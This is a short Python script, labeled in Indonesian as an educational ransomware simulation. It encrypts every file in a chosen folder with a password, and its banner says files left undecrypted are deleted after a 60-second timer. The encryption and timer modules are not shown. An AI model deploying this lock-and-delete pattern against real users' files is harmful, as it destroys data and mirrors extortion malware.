import os
from encryptor import *
from timer import start_timer

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    print("🛑 RANSOMWARE EDUKASI - SIMULASI TANPA LIBRARY")
    print("⚠️ Semua file akan dikunci, hanya password yang bisa membuka!")
    print("🔒 File akan auto delete dalam 60 detik jika tidak didekripsi.\n")

def menu():
    clear()
    banner()
    print("[1] 🔐 Enkripsi Folder")
    print("[2] 🔓 Dekripsi Folder")
    print("[3] ❌ Keluar")

def main():
    while True:
        menu()
        choice = input("\nPilih opsi: ").strip()
        if choice == "1":
            folder = input("📁 Path folder target: ").strip()
            if not os.path.isdir(folder):
                print("❌ Folder tidak ditemukan!")
                input("ENTER untuk kembali...")
                continue
            password = input("🔑 Buat password (jangan sampai lupa!): ").strip()
            files = get_all_files(folder)
            for f in files:
                if encrypt_file(f, password):
                    print(f"✅ Enkripsi: {f}")
            print("🕒 Timer dimulai (60 detik)...")
            start_timer(60, folder, print)
            input("ENTER untuk kembali ke menu...")
        elif choice == "2":
            folder = input("📁 Path folder target: ").strip()
            password = input("🔑 Masukkan password: ").strip()
            files = get_all_files(folder)
            for f in files:
                if decrypt_file(f, password):
                    print(f"✅ Dekripsi: {f}")
            input("ENTER untuk kembali...")
        elif choice == "3":
            break
        else:
            print("❌ Opsi tidak valid.")
            input("ENTER untuk kembali...")

if __name__ == "__main__":
    main()
